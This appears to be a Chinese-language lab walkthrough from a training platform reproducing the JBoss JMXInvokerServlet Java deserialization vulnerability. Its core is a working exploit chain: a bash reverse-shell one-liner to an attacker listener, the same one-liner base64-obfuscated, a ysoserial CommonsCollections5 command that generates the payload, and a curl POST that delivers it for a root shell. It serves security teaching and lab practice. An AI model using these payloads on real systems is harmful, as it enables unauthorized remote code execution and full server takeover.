# JBoss JMXInvokerServlet 反序列化漏洞

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞编号** | 无CVE编号 |
| **影响版本** | JBoss 5.x/6.x |
| **漏洞类型** | Java反序列化 |
| **危险等级** | 🔴 高危 |
| **默认端口** | 8080 |
| **涉及组件** | /invoker/JMXInvokerServlet / Apache Commons Collections |

## 漏洞概述

这是经典的 JBoss 反序列化漏洞。JBoss在 `/invoker/JMXInvokerServlet` 请求中读取了用户传入的对象，然后利用 Apache Commons Collections 中的 Gadget 执行任意代码。

## 漏洞复现

靶机启动后，会有1~3分钟时间初始化，初始化完成后访问 `http://your-ip:8080/` 即可看到JBoss默认页面：

![JBoss默认页面](https://static.nextcyber.cn/attachments/images/course/task/c72947f8233a445f888b107d5142dfdb.png)

JBoss在处理 `/invoker/JMXInvokerServlet` 请求的时候读取了对象，我们借助 [ysoserial](https://github.com/frohoff/ysoserial) 的 `CommonsCollections5` 利用链来复现。生成Payload：

```bash
bash -i >& /dev/tcp/192.168.2.6/1234 0>&1

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}
```

```bash
┌──(root㉿nextcyber)-[~]
└─# wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

┌──(root㉿nextcyber)-[~]
└─# java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}" > poc.ser

┌──(root㉿nextcyber)-[~]
└─# ls   
poc.ser  ysoserial-all.jar
```

## 反弹shell

本地监听端口 `1234`，我们将 `poc.ser` 文件内容作为 `POST Body` 发送：

```bash
curl http://192.168.2.47:8080/invoker/JMXInvokerServlet --data-binary @poc.ser
```

![反弹shell成功](https://static.nextcyber.cn/attachments/images/course/task/1bcbe3c836204e18b839e86d2124ee3a.png)

成功拿到 root 用户的 shell。

---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/91) 进行实战练习。

## 免责声明

本文档仅供安全研究和学习目的使用，请勿用于非法活动。
